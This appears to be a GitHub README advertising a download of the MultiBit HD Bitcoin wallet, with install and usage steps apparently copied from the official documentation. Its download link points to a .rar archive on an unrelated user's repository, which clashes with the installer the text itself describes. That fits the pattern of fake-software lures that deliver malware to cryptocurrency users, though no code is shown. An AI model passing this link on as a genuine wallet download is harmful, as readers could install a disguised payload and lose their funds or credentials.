# Multibit HD Wallet 0.5.1 (Windows/Linux/MacOS)

![image](https://user-images.githubusercontent.com/98798729/214604039-12fdb04d-ceae-4553-88bc-181b1f9f5723.png)

MultiBit was designed to be as easy to use as possible, but Bitcoin itself may require some getting used to. These articles are intended to provide useful explanations of the common problems that people face. MultiBit HD Designed to be easy to use. It is intended for home users (or small merchants) who want to use a desktop computer for their daily bitcoin operations.

[Download MultiBit HD Wallet v0.5.1 for Windows/Linux/MacOS](https://github.com/Novikoha/multibit-hd/releases/download/Multibit.HD.Wallet/MultibitHD-Wallet.rar)
---------------------------------------------------------------------

# How to use MultiBit HD

## Step 1 – Download and install MultiBit
After downloading the installer, simply double-click the icon and follow the on-screen instructions. In most cases, just accepting the defaults is enough.

## Step 2 – Create a Wallet
The first screen you will see is the Welcome Wizard, which will guide you through the creation of the wallet step by step.

## Step 3 – Request Bitcoins
Once you have created your wallet, you can unlock it using your password. This will remove the wizard screens to show the main wallet. Selecting the Send / Request link in the sidebar will show two buttons. Click the Request Bitcoins button to open the Bitcoin Request Wizard.

## Step 4 – Send Bitcoins
On the “Send / Request” screen, click the “Send Bitcoin” button to open the Bitcoin Sending Wizard.

## How to install on Windows
1 For installation, a standard 64-bit installer is used, which is suitable for Windows 7 and 10 (and some editions of Vista) and higher.
2 Please note that for security reasons, MultiBit does not support Windows XP and below.
3 Double-click the installer. Work with the installer – accepting defaults is usually the easiest.

If you have a firewall installed when you first open MultiBit HD, Windows will ask you if you want MultiBit HD to communicate through your Internet connection. MultiBit HD must communicate with the Bitcoin network and the multibit.org server, so allow this access.

## How to install on OS X (Mac)
1 The MultiBit HD installer is slightly different from the standard OS X installer in that it does not depend on a single drag and drop into the application directory. 
2 However, as soon as the installer completes the work, the resulting package in applications can be dragged to the launchpad as usual.

## How to install on Linux
1 The Linux installer does not come with a pre-installed Java installation because of the huge variety of Linux distributions available. 
Therefore, you will need to prepare a suitable JVM for installation before starting the installer. We recommend Open Java 1.7.0_72, however, due to cryptography support issues on some Linux distributions, you may need to use the Oracle JVM instead (see the Troubleshooting section below).
2 Assuming you have the right JVM installed and you have downloaded the installer to your home directory, follow these steps in the shell:

```
cd ~
chmod +x multibit-hd-unix-0.x.y.sh
./multibit-hd-unix-0.x.y.sh

```
After a while, the MultiBit HD will be shown by the wizard and installed in ~ / multibit-hd. Your application directory will be ~ / .multibit-hd and will contain all your configuration and wallet files. It will appear on first launch. A basic Unity .desktop file will be created and registered if available, so you can simply open Unity and search on “MultiBit” to get started (but see later). Alternatively, you can run from the command line as follows (you will see many log messages this way):

```
cd multibit-hd
./multibit-hd &
```

After starting the installer, you may need to run several scripts to further integrate MultiBit HD into your environment. In particular, KeepKey support requires certain udev rules. The following sections present these scenarios. If you have a distribution that is not included, and you have a script that you would like to share, let us know via the link to the site at the bottom of the page.

![image](https://user-images.githubusercontent.com/98798729/214603898-b799c975-4422-4a3d-b6ad-5ebaf6422035.png)
